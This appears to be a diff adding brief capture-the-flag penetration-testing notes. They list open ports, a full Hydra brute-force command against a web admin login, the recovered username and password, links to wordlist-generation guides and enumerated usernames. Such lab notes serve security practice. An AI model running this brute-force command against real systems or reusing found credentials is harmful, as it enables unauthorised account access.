@@ -1,0 +1,32 @@
+[*] ftp found on tcp/21.
+
+
+
+[*] http found on tcp/80.
+Hydra attack
+
+`hydra -l mitch -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt 10.10.122.146 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=submit:F=incorrect"`
+http://10.10.73.7/simple/admin/login.php
+Login: mitch
+password: secret
+
+[1:37 PM] Ralph Lloren
+Isaac Huston
+This is going into the weeds as far as bruteforcing.
+https://www.hackingarticles.in/a-detailed-guide-on-cewl/
+ 
+https://www.hackingarticles.in/comprehensive-guide-on-cupp-a-wordlist-generating-tool/
+A Detailed Guide on Cewl - Hacking Articles
+Hi, Pentesters! In this article, we are going to focus on the Kali Linux tool “Cewl” which will basically help you to create a wordlist.
+
+[*] ssh found on tcp/2222.
+
+usernames
+
+[+] installer -
+[+] internal - 
+[+] itsadmin - 
+[+] jamfsoftware
+[+] me
+
+
